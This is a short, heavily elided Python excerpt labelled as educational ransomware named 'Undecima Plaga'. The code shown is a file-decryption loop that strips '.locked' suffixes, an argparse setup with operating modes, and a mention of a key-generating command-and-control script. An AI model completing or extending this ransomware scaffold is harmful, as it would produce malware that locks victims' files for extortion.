...
#  generado por servidor_CC.py --generar-llaves
...
def descifrar_archivos(directorio, llave_privada_local):
    ...
    for ruta in archivos:
        ruta_original = ruta.removesuffix(".locked")
...
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Undecima Plaga — Ransomware (educativo)")
    modo = parser.add_mutually_exclusive_group(required=True) # Modo de operacion (mutuamente excluyentes)
